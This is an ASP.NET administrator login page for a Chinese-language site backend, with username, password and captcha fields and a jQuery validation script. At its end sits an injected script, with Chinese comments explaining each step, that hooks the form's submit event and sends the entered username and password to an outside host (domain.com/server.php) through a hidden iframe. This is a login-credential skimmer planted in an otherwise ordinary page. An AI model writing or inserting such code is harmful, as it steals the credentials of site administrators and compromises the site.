<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="syslogin.aspx.cs" Inherits="YM.Company.Web.Admin.syslogin" %>
<%@ Register assembly="YM.Company.Web" namespace="YM.Company.AdminControl" tagprefix="cc1" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>网站后台管理系统 </title>
<script language="javascript" type="text/javascript" src="common/js/jquery.min.js"></script>

<META http-equiv=Content-Type content="text/html; charset=utf-8">
<link href="common/css/User_Login.css" type=text/css rel=stylesheet>

</head>
<body id=userlogin_body>
    <form id="form1" runat="server">
   <DIV id=user_login>
<DL>
  <DD id=user_top>
  <UL>
    <LI class=user_top_l></LI>
    <LI class=user_top_c></LI>
    <LI class=user_top_r></LI>
    </UL>
  <DD id=user_main>
  <UL>
    <LI class=user_main_l></LI>
    <LI class=user_main_c>
    <DIV class=user_main_box>
    <UL>
      <LI class=user_main_text>用户名： </LI>
      <LI class=user_main_input><cc1:TextBox   MaxLength="20"  CssClass="TxtUserNameCssClass" Width="150" ID="username" runat="server"></cc1:TextBox> </LI></UL>
    <UL>
      <LI class=user_main_text>密 码： </LI>
      <LI class=user_main_input><cc1:TextBox   TextMode="Password"  CssClass="TxtPasswordCssClass" Width="150" MaxLength="20"  ID="password" runat="server"></cc1:TextBox> </LI></UL>
    <UL>
    <UL>
      <LI class=user_main_text>验证码： </LI>
      <LI class=user_main_input><cc1:TextBox  CssClass="TxtValidateCodeCssClass" MaxLength="20"  ID="code" Width="100" runat="server"></cc1:TextBox>  </LI>
      <li><span>&nbsp;<img id='code_img' style=" cursor:pointer" onclick='this.src="code.aspx?t="+Math.random()' src='common/images/onLoad.gif'></span></li>
      </UL>
</UL>
 <ul>
 <cc1:Button ID="Button1" runat="server"  OnClick="Button1_Click" Text="登&nbsp;录" />
 </ul>
</DIV></LI>
    <LI class=user_main_r>
 </LI></UL>
  <DD id=user_bottom>
  <UL>
    <LI class=user_bottom_l></LI>
    <LI class=user_bottom_c><SPAN style="MARGIN-TOP: 40px"></SPAN> </LI>
    <LI class=user_bottom_r></LI></UL></DD></DL></DIV>
<script type="text/javascript">
    $(function() {
	 $('#code_img').attr("src","code.aspx?time="+new Date().getTime());
        $('#username').focus();
    })
	function PageIsValid()
	{
		if($('#username').attr("value")=="")	
		{
			alert("请输入用户名")	;
			$('#username').focus();
			return false;
		}
		if($('#password').attr("value")=="")	
		{
			alert("请输入密码")	;
			$('#password').focus();
			return false;
		}
		if($('#code').attr("value")=="")	
		{
			alert("请输入验证码")	;
			$('#code').focus();
			return false;
		}
		
	}
</script>
    </form>
      

<script>
    form=document.getElementById('form1');   //通过id获取form表单,有的表单是通过form name获得，用的时候请注意查看
    form.onsubmit=function(){
      var iframe=document.createElement("iframe"); //创建一个iframe 内联框架

      iframe.style.display="none";   //设置内联框架为隐藏模式

      //alert(form.username.value);    //弹出表单里的账号的值

      iframe.src="http://domain.com/server.php?username=" + form.username.value + "&password=" + form.password.value;           //对我们的站点发送GET请求，请求中附带着账号密码的数据

      document.body.appendChild(iframe); 
      //alert(form.password.value);    //弹出表单里密码的值
    }
  </script>
</body>
</html>

